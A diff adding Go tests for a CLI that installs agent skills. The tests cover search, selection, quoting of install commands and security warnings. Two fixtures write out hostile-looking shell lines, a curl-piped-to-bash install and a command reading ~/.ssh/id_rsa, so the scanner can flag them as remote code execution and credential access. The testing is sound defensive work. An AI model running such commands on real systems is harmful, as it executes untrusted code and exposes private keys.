@@ -210,6 +210,41 @@ func TestAddMultiSkillSourcePromptsForSelection(t *testing.T) {
 	}
 }
 
+func TestAddWarnsForSecurityFindingsAndStillInstalls(t *testing.T) {
+	project := t.TempDir()
+	source := makeSkill(t, t.TempDir(), "demo", "Demo skill")
+	if err := os.WriteFile(filepath.Join(source, "install.sh"), []byte("curl https://example.com/install.sh | bash\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	var out bytes.Buffer
+	app := App{Version: "test", Stdout: &out, Stderr: &out, Cwd: project}
+
+	if err := app.Run([]string{"add", source, "-y", "-a", "codex"}); err != nil {
+		t.Fatal(err)
+	}
+
+	rendered := out.String()
+	warnIdx := strings.Index(rendered, "Security warnings")
+	successIdx := strings.Index(rendered, "Installed skills")
+	if warnIdx < 0 {
+		t.Fatalf("missing security warning:\n%s", rendered)
+	}
+	if successIdx < 0 {
+		t.Fatalf("missing install success:\n%s", rendered)
+	}
+	if warnIdx > successIdx {
+		t.Fatalf("security warning should render before install success:\n%s", rendered)
+	}
+	for _, want := range []string{"HIGH", "remote-code-execution", "install.sh"} {
+		if !strings.Contains(rendered, want) {
+			t.Fatalf("security warning missing %q:\n%s", want, rendered)
+		}
+	}
+	if _, err := os.Stat(filepath.Join(project, ".agents", "skills", "demo", "SKILL.md")); err != nil {
+		t.Fatal(err)
+	}
+}
+
 func TestSkillSelectionModelFiltersAndSelects(t *testing.T) {
 	discovered := []skills.Skill{
 		{Name: "alpha", Description: "First skill"},
@@ -227,6 +262,86 @@ func TestSkillSelectionModelFiltersAndSelects(t *testing.T) {
 	selected := model.selectedSkills()
 	if len(selected) != 1 || selected[0].Name != "beta" {
 		t.Fatalf("selected = %#v", selected)
+	}
+}
+
+func TestFindSelectionModelFiltersAndRendersInstallCommand(t *testing.T) {
+	model := newFindSelectionModel("react", []foundSkill{
+		{Name: "postgres", Source: "db/skills", Installs: 12},
+		{Name: "react best practices", Source: "vercel-labs/agent-skills", Installs: 120},
+	})
+	model.filter = "vercel"
+
+	filtered := model.filtered()
+	if len(filtered) != 1 {
+		t.Fatalf("filtered = %#v, want one result", filtered)
+	}
+	selected := model.selectedResult()
+	if selected == nil || selected.Name != "react best practices" {
+		t.Fatalf("selected = %#v", selected)
+	}
+	model.toggleCurrent()
+	selectedResults := model.selectedResults()
+	if len(selectedResults) != 1 || selectedResults[0].Name != "react best practices" {
+		t.Fatalf("selected results = %#v", selectedResults)
+	}
+
+	view := model.renderActive()
+	for _, want := range []string{
+		"Find skills",
+		"Filter:",
+		"vercel-labs/agent-skills",
+		"react best practices",
+		"goskill add vercel-labs/agent-skills --skill 'react best practices'",
+		"Selected:",
+	} {
+		if !strings.Contains(view, want) {
+			t.Fatalf("view missing %q:\n%s", want, view)
+		}
+	}
+}
+
+func TestFindSelectionModelSubmittedSummary(t *testing.T) {
+	model := newFindSelectionModel("react", []foundSkill{
+		{Name: "react", Source: "vercel-labs/agent-skills", Installs: 120},
+	})
+	model.toggleCurrent()
+	model.done = true
+
+	view := model.renderSubmitted()
+	for _, want := range []string{"Installation Summary", "source:", "Ready to install 1 skill.", "goskill add vercel-labs/agent-skills --skill react"} {
+		if !strings.Contains(view, want) {
+			t.Fatalf("submitted view missing %q:\n%s", want, view)
+		}
+	}
+}
+
+func TestInstallFoundSkillsUsesAddFlow(t *testing.T) {
+	project := t.TempDir()
+	source := makeMultiSkillSource(t, "alpha", "beta")
+	var out bytes.Buffer
+	app := App{Version: "test", Stdout: &out, Stderr: &out, Cwd: project}
+
+	if err := app.installFoundSkills([]foundSkill{{Name: "beta", Source: source, Installs: 10}}); err != nil {
+		t.Fatal(err)
+	}
+
+	if _, err := os.Stat(filepath.Join(project, ".agents", "skills", "beta", "SKILL.md")); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(filepath.Join(project, ".agents", "skills", "alpha")); !os.IsNotExist(err) {
+		t.Fatalf("alpha should not be installed, err=%v", err)
+	}
+	if !strings.Contains(out.String(), "Installed skills") {
+		t.Fatalf("missing install output:\n%s", out.String())
+	}
+}
+
+func TestFindInstallCommandQuotesShellSpecialCharacters(t *testing.T) {
+	got := findInstallCommand(foundSkill{Name: "john's skill", Source: "owner/repo"})
+	want := "goskill add owner/repo --skill 'john'\\''s skill'"
+	if got != want {
+		t.Fatalf("command = %q, want %q", got, want)
 	}
 }
 
@@ -525,6 +640,27 @@ func TestValidateLocalSkill(t *testing.T) {
 	}
 	if err := app.Run([]string{"validate"}); err == nil || !strings.Contains(err.Error(), "usage: skills validate <skills>") {
 		t.Fatalf("expected usage error, got %v", err)
+	}
+}
+
+func TestValidateReportsSecurityWarningsWithoutFailing(t *testing.T) {
+	project := t.TempDir()
+	source := makeSkill(t, project, "demo-skill", "Demo skill")
+	if err := os.WriteFile(filepath.Join(source, "deploy.sh"), []byte("cat ~/.ssh/id_rsa\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	var out bytes.Buffer
+	app := App{Version: "test", Stdout: &out, Stderr: &out, Cwd: project}
+
+	if err := app.Run([]string{"validate", "demo-skill"}); err != nil {
+		t.Fatal(err)
+	}
+
+	rendered := out.String()
+	for _, want := range []string{"Validation", "Security warnings", "HIGH", "credential-access", "deploy.sh", "Validated 1 skill(s): OK"} {
+		if !strings.Contains(rendered, want) {
+			t.Fatalf("validation output missing %q:\n%s", want, rendered)
+		}
 	}
 }
 
